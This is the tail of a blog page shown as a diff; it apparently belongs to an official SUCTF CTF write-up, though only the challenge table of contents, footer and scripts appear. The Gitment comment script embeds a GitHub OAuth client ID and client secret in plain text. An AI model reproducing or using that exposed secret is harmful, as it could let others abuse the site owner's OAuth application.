+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF招新赛官方wp"><span class="nav-number">1.</span> <span class="nav-text">SUCTF招新赛官方wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#————"><span class="nav-number">1.1.</span> <span class="nav-text">————</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#这是个模版-web"><span class="nav-number">1.2.1.</span> <span class="nav-text">这是个模版[web]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss1"><span class="nav-number">1.2.2.</span> <span class="nav-text">xss1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss2"><span class="nav-number">1.2.3.</span> <span class="nav-text">xss2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-is-No-1"><span class="nav-number">1.2.4.</span> <span class="nav-text">php is No.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-upload"><span class="nav-number">1.2.5.</span> <span class="nav-text">baby-upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#inclue-me"><span class="nav-number">1.2.6.</span> <span class="nav-text">inclue-me</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#onepiece"><span class="nav-number">1.2.7.</span> <span class="nav-text">onepiece</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#where-are-you-from-level-1"><span class="nav-number">1.2.8.</span> <span class="nav-text">where are you from  level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#where-are-you-from-level-2"><span class="nav-number">1.2.9.</span> <span class="nav-text">where are you from  level 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gallery"><span class="nav-number">1.2.10.</span> <span class="nav-text">gallery</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ClassicSqli"><span class="nav-number">1.2.11.</span> <span class="nav-text">ClassicSqli</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#秘密云盘"><span class="nav-number">1.2.12.</span> <span class="nav-text">秘密云盘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#403readfile"><span class="nav-number">1.2.13.</span> <span class="nav-text">403readfile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EASY-upload"><span class="nav-number">1.2.14.</span> <span class="nav-text">EASY_upload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#secure-html"><span class="nav-number">1.2.15.</span> <span class="nav-text">secure html</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">1.3.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-overflow-file-structure"><span class="nav-number">1.3.1.</span> <span class="nav-text">easy_overflow_file_structure</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babyarray"><span class="nav-number">1.3.2.</span> <span class="nav-text">babyarray</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#basic-pwn"><span class="nav-number">1.3.3.</span> <span class="nav-text">basic-pwn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack"><span class="nav-number">1.3.4.</span> <span class="nav-text">stack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#int-overflow-pwn"><span class="nav-number">1.3.5.</span> <span class="nav-text">int_overflow_pwn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EZ-heap"><span class="nav-number">1.3.6.</span> <span class="nav-text">EZ_heap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink"><span class="nav-number">1.3.7.</span> <span class="nav-text">unlink</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rev"><span class="nav-number">1.4.</span> <span class="nav-text">Rev</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#table"><span class="nav-number">1.4.1.</span> <span class="nav-text">table</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hash"><span class="nav-number">1.4.2.</span> <span class="nav-text">hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#re-register"><span class="nav-number">1.4.3.</span> <span class="nav-text">re-register</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#basic-re"><span class="nav-number">1.4.4.</span> <span class="nav-text">basic re</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HelloPython"><span class="nav-number">1.4.5.</span> <span class="nav-text">HelloPython</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#game"><span class="nav-number">1.4.6.</span> <span class="nav-text">game</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dump"><span class="nav-number">1.4.7.</span> <span class="nav-text">dump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-vm-engine"><span class="nav-number">1.4.8.</span> <span class="nav-text">easy_vm_engine</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">1.5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#follow-me"><span class="nav-number">1.5.1.</span> <span class="nav-text">follow-me</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#single-dog"><span class="nav-number">1.5.2.</span> <span class="nav-text">single-dog</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stature"><span class="nav-number">1.5.3.</span> <span class="nav-text">stature</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#one-image-3F"><span class="nav-number">1.5.4.</span> <span class="nav-text">one image %3F</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hidden"><span class="nav-number">1.5.5.</span> <span class="nav-text">hidden</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#佛家妙语"><span class="nav-number">1.5.6.</span> <span class="nav-text">佛家妙语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#流量"><span class="nav-number">1.5.7.</span> <span class="nav-text">流量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#人类的本质"><span class="nav-number">1.5.8.</span> <span class="nav-text">人类的本质</span></a></li></ol></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Susers</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</span></div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">全站共31.0k字</span>
+</div>
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script type="text/javascript">
+        (function() {
+            var id = '';
+            var owner = 'XuCcc';
+            var repo = 'XuCcc.github.io';
+            var clientId = 'f03b9d3d14222e890fdc';
+            var clientSecret = '676341561e48fad43015c644798175b16ee69fe0';
+
+            var gitment = new Gitment({
+                owner: owner,
+                repo: repo,
+                oauth: {
+                    client_id: clientId,
+                    client_secret: clientSecret,
+                },
+            });
+            gitment.render('comments');
+        })();
+    </script>
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" async src="//push.zhanzhang.baidu.com/push.js">
+</script>
+
+
+</body>
+</html>
